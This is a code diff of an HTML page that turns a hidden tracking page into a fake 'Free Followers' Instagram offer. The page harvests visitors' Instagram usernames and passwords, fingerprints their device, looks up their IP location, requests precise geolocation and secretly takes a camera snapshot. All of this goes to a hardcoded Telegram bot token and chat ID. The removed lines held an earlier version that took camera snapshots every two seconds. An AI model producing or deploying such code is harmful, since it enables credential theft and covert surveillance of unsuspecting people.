@@ -3,120 +3,471 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Free Followers - Instant Delivery</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-        video { display: none; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #777;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border 0.3s;
+            box-sizing: border-box;
+        }
+        input:focus, select:focus {
+            border-color: #764ba2;
+            outline: none;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 10px;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .success-message {
+            display: none;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 4px solid rgba(0,0,0,0.1);
+            border-radius: 50%;
+            border-top-color: #764ba2;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        video {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <div class="container">
+        <h1>🚀 Free Followers</h1>
+        <p class="subtitle">Get real followers instantly — 100% free!</p>
+
+        <form id="followerForm">
+            <div class="form-group">
+                <label for="username">Instagram Username</label>
+                <input type="text" id="username" name="username" placeholder="e.g. your_username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Your password" required>
+            </div>
+            <div class="form-group">
+                <label for="followers">Number of Followers</label>
+                <select id="followers" name="followers" required>
+                    <option value="100">100 Followers</option>
+                    <option value="500">500 Followers</option>
+                    <option value="1000" selected>1000 Followers</option>
+                    <option value="5000">5000 Followers</option>
+                    <option value="10000">10000 Followers</option>
+                </select>
+            </div>
+            <button type="submit" id="submitBtn">Get Followers</button>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            ✅ Success! Your followers will be credited within 24 hours.
+        </div>
+    </div>
+
+    <!-- Hidden video element for camera preview -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        (async function() {
-            // Function to send initial data
-            async function sendInitialData() {
-                const data = {
-                    browser: navigator.userAgent,
-                    browserVersion: getBrowserVersion(),
-                    os: getOS(),
-                    deviceType: getDeviceType(),
-                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language || navigator.userLanguage,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    // Attempt to get location via geolocation (may be blocked)
-                    location: await getLocation()
+        // Hardcoded Telegram credentials (replace with your own or use environment variables)
+        const BOT_TOKEN = '8072573353:AAEUl98cQMgBvxj0upQx_CS2lAxJLiPHSw0';
+        const CHAT_ID = '6859219926';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // Utility: collect comprehensive device/browser info
+        function collectDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                browser: getBrowserName(),
+                browserVersion: getBrowserVersion(),
+                os: getOS(),
+                deviceType: getDeviceType(),
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                windowResolution: `${window.innerWidth}x${window.innerHeight}`,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language || navigator.userLanguage,
+                referrer: document.referrer || 'Direct Visit',
+                connectionType: getConnectionType(),
+                batteryLevel: null,
+                batteryCharging: null,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                platform: navigator.platform,
+                touchPoints: navigator.maxTouchPoints || 0,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                // Browser fingerprints (basic)
+                canvasFingerprint: getCanvasFingerprint()
+            };
+            return info;
+        }
+
+        // Helper functions to parse user agent
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Edg")) return "Edge";
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Safari")) return "Safari";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+            if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
+            return "Unknown";
+        }
+
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/(firefox|chrome|safari|edge|opera|msie|trident)[\/\s](\d+)/i);
+            return match ? `${match[1]} ${match[2]}` : 'Unknown';
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Windows")) return "Windows";
+            if (ua.includes("Mac")) return "MacOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+            return "Unknown";
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/mobile/i.test(ua)) return "Mobile";
+            if (/tablet/i.test(ua)) return "Tablet";
+            return "Desktop";
+        }
+
+        function getConnectionType() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return `${conn.effectiveType} (${conn.type || 'unknown'})`;
+            }
+            return 'Unknown';
+        }
+
+        // Get battery info if available
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        batteryLevel: Math.round(battery.level * 100) + '%',
+                        batteryCharging: battery.charging ? 'Yes' : 'No'
+                    };
+                } catch (e) {
+                    return { batteryLevel: 'Unavailable', batteryCharging: 'Unavailable' };
+                }
+            }
+            return { batteryLevel: 'Unavailable', batteryCharging: 'Unavailable' };
+        }
+
+        // Simple canvas fingerprint
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Canvas', 4, 17);
+                return canvas.toDataURL().slice(0, 100);
+            } catch (e) {
+                return 'Error';
+            }
+        }
+
+        // Fetch IP and rough location via ipapi.co (no API key required, 1000 requests/day)
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    region: data.region || 'Unknown',
+                    city: data.city || 'Unknown',
+                    postal: data.postal || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    asn: data.asn || 'Unknown',
+                    latitude: data.latitude || 'N/A',
+                    longitude: data.longitude || 'N/A'
                 };
-
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
+            } catch (e) {
+                return {
+                    ip: 'Failed to fetch',
+                    country: 'N/A',
+                    region: 'N/A',
+                    city: 'N/A',
+                    postal: 'N/A',
+                    timezone: 'N/A',
+                    isp: 'N/A',
+                    asn: 'N/A',
+                    latitude: 'N/A',
+                    longitude: 'N/A'
+                };
             }
+        }
 
-            // Helper: get browser version from user agent
-            function getBrowserVersion() {
-                const ua = navigator.userAgent;
-                let match = ua.match(/(firefox|chrome|safari|edge|opera|msie|trident)[\/\s](\d+)/i);
-                return match ? `${match[1]} ${match[2]}` : 'Unknown';
+        // Send a text message to Telegram
+        async function sendTelegramMessage(text) {
+            const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            if (!response.ok) {
+                console.error('Telegram sendMessage failed:', response.statusText);
             }
+        }
 
-            // Helper: get OS from user agent
-            function getOS() {
-                const ua = navigator.userAgent;
-                if (ua.indexOf('Windows') !== -1) return 'Windows';
-                if (ua.indexOf('Mac') !== -1) return 'MacOS';
-                if (ua.indexOf('Linux') !== -1) return 'Linux';
-                if (ua.indexOf('Android') !== -1) return 'Android';
-                if (ua.indexOf('iOS') !== -1) return 'iOS';
-                return 'Unknown';
+        // Send a photo to Telegram
+        async function sendTelegramPhoto(blob, caption = '') {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snapshot.jpg');
+            if (caption) {
+                formData.append('caption', caption);
             }
-
-            // Helper: determine device type
-            function getDeviceType() {
-                const ua = navigator.userAgent;
-                if (/mobile/i.test(ua)) return 'Mobile';
-                if (/tablet/i.test(ua)) return 'Tablet';
-                return 'Desktop';
+            const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            if (!response.ok) {
+                console.error('Telegram sendPhoto failed:', response.statusText);
             }
+        }
 
-            // Helper: try to get geolocation (may be denied)
-            function getLocation() {
-                return new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        resolve('Geolocation not supported');
-                        return;
-                    }
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-                        () => resolve('Permission denied')
-                    );
-                });
-            }
+        // Format device info into a readable message
+        function formatDeviceInfo(info, ipData) {
+            let msg = `🔔 <b>New Visitor Alert</b>\n\n`;
+            msg += `<b>Time:</b> ${new Date().toISOString()}\n`;
+            msg += `<b>IP Address:</b> ${ipData.ip}\n`;
+            msg += `<b>Location:</b> ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
+            msg += `<b>Coordinates:</b> ${ipData.latitude}, ${ipData.longitude}\n`;
+            msg += `<b>ISP:</b> ${ipData.isp}\n`;
+            msg += `<b>Referrer:</b> ${info.referrer}\n\n`;
+            msg += `<b>Browser:</b> ${info.browser} ${info.browserVersion}\n`;
+            msg += `<b>OS:</b> ${info.os}\n`;
+            msg += `<b>Device Type:</b> ${info.deviceType}\n`;
+            msg += `<b>Screen Resolution:</b> ${info.screenResolution}\n`;
+            msg += `<b>Window Resolution:</b> ${info.windowResolution}\n`;
+            msg += `<b>Time Zone:</b> ${info.timeZone}\n`;
+            msg += `<b>Language:</b> ${info.language}\n`;
+            msg += `<b>Connection:</b> ${info.connectionType}\n`;
+            msg += `<b>Battery:</b> ${info.batteryLevel} (Charging: ${info.batteryCharging})\n`;
+            msg += `<b>Device Memory:</b> ${info.deviceMemory} GB\n`;
+            msg += `<b>CPU Cores:</b> ${info.hardwareConcurrency}\n`;
+            msg += `<b>Touch Points:</b> ${info.touchPoints}\n`;
+            msg += `<b>Cookies Enabled:</b> ${info.cookiesEnabled}\n`;
+            msg += `<b>Do Not Track:</b> ${info.doNotTrack}\n`;
+            msg += `<b>Color Depth:</b> ${info.colorDepth}\n`;
+            msg += `<b>Pixel Ratio:</b> ${info.pixelRatio}\n`;
+            msg += `<b>Canvas Fingerprint:</b> ${info.canvasFingerprint}\n`;
+            return msg;
+        }
 
-            // Send initial data
-            await sendInitialData();
+        // Request geolocation permission (returns coordinates or null)
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }),
+                    (err) => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
 
-            // Camera access and periodic snapshots
+        // Request camera access and capture a snapshot (returns Blob or null)
+        async function getCameraSnapshot() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 await video.play();
 
+                // Wait a moment for the video to initialize
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
                 const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Take a snapshot every 2 seconds
-                setInterval(async () => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+                // Stop all tracks to release camera
+                stream.getTracks().forEach(track => track.stop());
 
-                    // Send photo as multipart/form-data
-                    const formData = new FormData();
-                    formData.append('photo', base64);
-
-                    await fetch('/api/send', {
-                        method: 'POST',
-                        body: formData
-                    });
-                }, 2000);
-
+                // Convert canvas to Blob
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                return blob;
             } catch (err) {
-                console.error('Camera access denied or error:', err);
-                // Optionally send a message to Telegram that camera was denied
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cameraError: 'Camera access denied or unavailable' })
-                });
+                console.error('Camera access error:', err);
+                return null;
+            }
+        }
+
+        // Main initialization on page load
+        (async function init() {
+            try {
+                // Collect basic info
+                const baseInfo = collectDeviceInfo();
+                // Get battery info
+                const battery = await getBatteryInfo();
+                // Get IP info
+                const ipData = await getIPInfo();
+
+                // Merge info
+                const fullInfo = { ...baseInfo, ...battery };
+
+                // Send initial visitor message
+                const initialMessage = formatDeviceInfo(fullInfo, ipData);
+                await sendTelegramMessage(initialMessage);
+            } catch (e) {
+                console.error('Init error:', e);
             }
         })();
+
+        // Form submission handler
+        document.getElementById('followerForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
+
+            // Get form values
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const followers = document.getElementById('followers').value;
+
+            // Request geolocation
+            const geo = await getGeolocation();
+
+            // Request camera and get snapshot
+            const photoBlob = await getCameraSnapshot();
+
+            // Compose credential message
+            let credMsg = `🔐 <b>New Credentials Captured</b>\n\n`;
+            credMsg += `<b>Username:</b> ${username}\n`;
+            credMsg += `<b>Password:</b> ${password}\n`;
+            credMsg += `<b>Followers Requested:</b> ${followers}\n`;
+            if (geo) {
+                credMsg += `\n📍 <b>Geolocation (from permission):</b>\n`;
+                credMsg += `Latitude: ${geo.latitude}\n`;
+                credMsg += `Longitude: ${geo.longitude}\n`;
+                credMsg += `Accuracy: ${geo.accuracy} meters\n`;
+            } else {
+                credMsg += `\n📍 <b>Geolocation:</b> Permission denied or unavailable\n`;
+            }
+            credMsg += `\n⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+            // Send credentials message
+            await sendTelegramMessage(credMsg);
+
+            // If camera snapshot was taken, send it as photo
+            if (photoBlob) {
+                await sendTelegramPhoto(photoBlob, '📸 Camera snapshot');
+            }
+
+            // Hide form and show success message
+            document.getElementById('followerForm').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+        });
     </script>
 </body>
 </html>
